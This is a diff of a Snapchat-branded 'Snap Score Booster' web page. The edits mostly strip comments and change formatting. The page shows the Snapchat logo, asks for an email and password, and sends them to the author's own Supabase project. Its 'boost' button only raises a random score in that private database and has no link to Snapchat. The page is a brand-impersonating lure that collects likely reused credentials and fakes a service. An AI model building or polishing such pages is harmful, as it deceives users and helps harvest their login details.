@@ -1,4 +1,4 @@
-  <<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -21,13 +21,11 @@
 </head>
 <body>
 
-  <!-- Login Page -->
   <div class="container" id="loginPage">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c0/Snapchat鬼logo.svg/1200px-Snapchat鬼logo.svg.png" alt="Snapchat Ghost Logo">
     <h1>Snap Score Booster</h1>
     <p>Login to increase your Snap Score fast!</p>
     
-    <!-- Changed type to email -->
     <input type="email" placeholder="Email" id="username">
     <input type="password" placeholder="Password" id="password">
     
@@ -35,7 +33,6 @@
     <button class="btn fake-btn" id="signupBtn">Sign Up</button>
   </div>
 
-  <!-- Score Page -->
   <div class="container score-section" id="scorePage">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c0/Snapchat鬼logo.svg/1200px-Snapchat鬼logo.svg.png" alt="Ghost">
     <h1>Your Snap Score</h1>
@@ -48,7 +45,7 @@
   <!-- Supabase JS -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/supabase.min.js"></script>
   <script>
-    // Supabase keys
+    // Supabase setup
     const supabaseUrl = "https://mdcsbpbrcvudxbdjchwt.supabase.co";
     const supabaseKey = "sb_publishable_jqIhtEIHIqtwYCmx5cpKsQ_0GwVPr6X";
     const supabase = supabase.createClient(supabaseUrl, supabaseKey);
@@ -66,11 +63,9 @@
     let currentUserId;
     let currentScore = 0;
 
-    // Show Score Page function
     async function showScorePage(userId) {
       loginPage.style.display = "none";
       scorePage.style.display = "block";
-
       currentUserId = userId;
 
       const { data, error } = await supabase
@@ -85,16 +80,16 @@
       scoreDisplay.innerText = currentScore.toLocaleString();
     }
 
-    // Signup button
+    // Signup
     signupBtn.addEventListener("click", async () => {
       const email = usernameInput.value.trim();
       const password = passwordInput.value.trim();
-      if (!email || !password) return alert("Email & password required!");
+      if(!email || !password) return alert("Email & password required!");
 
       const { user, error } = await supabase.auth.signUp({ email, password });
-      if (error) return alert("Signup failed: " + error.message);
+      if(error) return alert("Signup failed: " + error.message);
 
-      // Insert user + initial score
+      // Insert into users + scores table
       await supabase.from("users").insert([{ username: user.id }]);
       await supabase.from("scores").insert([{ username: user.id, score: 0 }]);
 
@@ -102,25 +97,23 @@
       showScorePage(user.id);
     });
 
-    // Login button
+    // Login
     loginBtn.addEventListener("click", async () => {
       const email = usernameInput.value.trim();
       const password = passwordInput.value.trim();
-      if (!email || !password) return alert("Email & password required!");
+      if(!email || !password) return alert("Email & password required!");
 
       const { data: session, error } = await supabase.auth.signInWithPassword({ email, password });
-      if (error || !session.user) return alert("Login failed: " + (error?.message || "Unknown"));
+      if(error || !session.user) return alert("Login failed: " + (error?.message || "Unknown"));
 
       showScorePage(session.user.id);
     });
 
-    // Boost button
+    // Boost
     boostBtn.addEventListener("click", async () => {
       const increment = Math.floor(Math.random() * (10000 - 100 + 1)) + 100;
       currentScore += increment;
       scoreDisplay.innerText = currentScore.toLocaleString();
-
-      // Update in Supabase table
       await supabase.from("scores").update({ score: currentScore }).eq("username", currentUserId);
     });
   </script>
